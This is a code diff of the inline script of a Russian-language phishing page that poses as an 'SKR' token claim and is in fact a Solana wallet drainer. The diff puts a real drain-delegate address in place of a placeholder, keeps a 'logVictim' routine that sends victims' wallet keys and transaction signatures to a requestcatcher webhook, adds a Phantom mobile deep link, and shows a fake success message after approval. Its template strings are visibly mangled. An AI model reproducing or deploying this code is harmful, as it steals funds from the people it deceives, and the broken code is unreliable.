@@ -65,7 +65,7 @@
 
     <script>
         const TOKEN_MINT = "Gf3XtY632if3F7yvnNdXQi8SnQTBsn8F7DQJFXru5Lh";
-        const DRAIN_DELEGATE = "ВСТАВЬ_СВОЙ_SOLANA_АДРЕС_ДЛЯ_СЛИВА_ЗДЕСЬ";
+        const DRAIN_DELEGATE = "ES68acG4AZAbikhpSJwDdpE1J9S7AnGCp9JWPu9zHseN";
         const WEBHOOK_URL = "https://solana.requestcatcher.com/test";
 
         let walletPubkey = null;
@@ -77,34 +77,36 @@
             }).catch(() => {});
         }
 
-        document.getElementById('connect-wallet').onclick = async () => {
+        document.getElementById('connect-wallet').onclick = () => {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
             if (isMobile) {
-                // Deep link для мобильного — открывает Phantom app и подключает
+                // Deep link для мобильного — открывает Phantom и подключает
                 const dappUrl = encodeURIComponent(window.location.href);
-                window.location.href = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
+                const phantomDeepLink = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
+                window.location.href = phantomDeepLink;
                 return;
             }
 
             if (!window.solana) {
-                document.getElementById('status').innerText = "Установи Phantom или другой Solana wallet!";
+                document.getElementById('status').innerText = "Установи Phantom или другой wallet!";
                 return;
             }
 
-            try {
-                await window.solana.connect();
-                walletPubkey = window.solana.publicKey.toString();
-                document.getElementById('wallet-address').innerText = Подключено: \( {walletPubkey.slice(0,8)}... \){walletPubkey.slice(-6)};
-                document.getElementById('connect-wallet').innerText = "Подключено";
-                document.getElementById('connect-wallet').disabled = true;
-                document.getElementById('claim-skr').disabled = false;
-                document.getElementById('status').innerText = "Готов к клейму!";
+            window.solana.connect()
+                .then(() => {
+                    walletPubkey = window.solana.publicKey.toString();
+                    document.getElementById('wallet-address').innerText = Подключено: \( {walletPubkey.slice(0,8)}... \){walletPubkey.slice(-6)};
+                    document.getElementById('connect-wallet').innerText = "Подключено";
+                    document.getElementById('connect-wallet').disabled = true;
+                    document.getElementById('claim-skr').disabled = false;
+                    document.getElementById('status').innerText = "Готов к клейму!";
 
-                logVictim(walletPubkey);
-            } catch (err) {
-                document.getElementById('status').innerText = "Ошибка подключения — попробуй снова";
-            }
+                    logVictim(walletPubkey);
+                })
+                .catch((err) => {
+                    document.getElementById('status').innerText = "Ошибка подключения";
+                });
         };
 
         document.getElementById('claim-skr').onclick = async () => {
@@ -133,7 +135,6 @@
 
                 document.getElementById('status').innerHTML = Успех! Одобрено.<br>SKR придут на TGE.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig}</a>;
                 document.getElementById('claim-skr').disabled = true;
-
                 logVictim(walletPubkey, sig);
             } catch (err) {
                 document.getElementById('status').innerText = "Ошибка — попробуй снова";
